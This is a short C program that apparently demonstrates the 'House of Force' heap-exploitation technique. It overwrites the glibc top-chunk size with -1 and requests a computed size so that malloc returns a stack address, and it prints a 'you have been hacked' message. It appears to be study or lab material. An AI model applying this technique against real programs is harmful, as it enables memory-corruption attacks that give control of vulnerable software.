#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

typedef long long LONG;
const LONG SIZE = 0x100;

struct Chunk
{
	LONG pre_size, size;
	struct Chunk *fd, *bk;
	char buf[0x100];
};


int main()
{
	char victim[] = "If you see this message, you have been hacked!\n";
	struct Chunk *CurChunk, *TopChunk;
	void *temp;
	LONG AllocatedSize, RequestSize;

	temp = malloc(SIZE);
	CurChunk = (struct Chunk *)(temp - 2*8);
	AllocatedSize = CurChunk->size & (~7);
	
	TopChunk = (struct Chunk *)((void *)CurChunk + AllocatedSize);
	TopChunk->size = -1;

	RequestSize = (LONG)victim - (LONG)TopChunk - 2*8 - 8;
	malloc(RequestSize);
	temp = malloc(SIZE);
	write(1, (char *)temp, 47);
}

